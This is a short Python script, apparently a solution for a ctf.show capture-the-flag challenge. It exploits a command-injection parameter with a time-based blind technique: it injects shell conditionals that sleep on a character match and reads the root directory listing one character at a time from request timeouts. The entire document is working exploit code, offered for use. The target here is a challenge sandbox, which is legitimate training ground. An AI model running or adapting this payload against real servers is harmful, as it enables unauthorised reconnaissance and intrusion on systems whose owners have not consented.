import requests
import time
import string

strs = string.ascii_letters + string.digits + string.punctuation
# print(strs)
result = ""
for i in range(1, 5):
    key = 0
    print(f'第{i}次测试')
    for j in range(1, 15):
        if key == 1:
            break
        for n in strs:
            payload = "if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i, j, n)
            # print(payload)
            url = "http://2b4e4861-a7bf-4e6e-a8c0-b3d76eeed9dd.chall.ctf.show/?c=" + payload
            try:
                requests.get(url, timeout=(2.5, 2.5))
            except:
                result = result + n
                print(f'第{i}测试结果{result}')
                break
            if n == '~':
                key = 1
    result += " "
